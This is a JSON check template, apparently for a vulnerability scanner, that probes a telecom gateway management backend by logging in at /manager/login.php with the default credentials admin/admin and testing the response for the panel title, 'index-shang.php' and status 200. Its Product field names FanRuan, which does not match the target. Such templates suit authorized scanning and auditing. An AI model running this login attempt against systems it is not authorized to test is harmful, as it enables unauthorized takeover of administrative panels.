{
    "Name": "telecom-gateway-default-password",
    "Description": "telecom-gateway-default-password",
    "Product": "帆软",
    "author": "chumeng",
    "Request":[
                {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/manager/login.php",
        "Port":"",
        "Data":"Name=admin&Pass=admin",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
            {
                "Operation": "contains",
                "Key":"",
                "Value": "<title>电信网关服务器管理后台</title>"
            },
            {
                "Operation": "contains",
                "Key":"",
                "Value": "index-shang.php"
            },
            {
                "Operation": "code",
                "Key":"",
                "Value": "200"
            }

        ]
        },
        "Next_decide":""
                }
]}
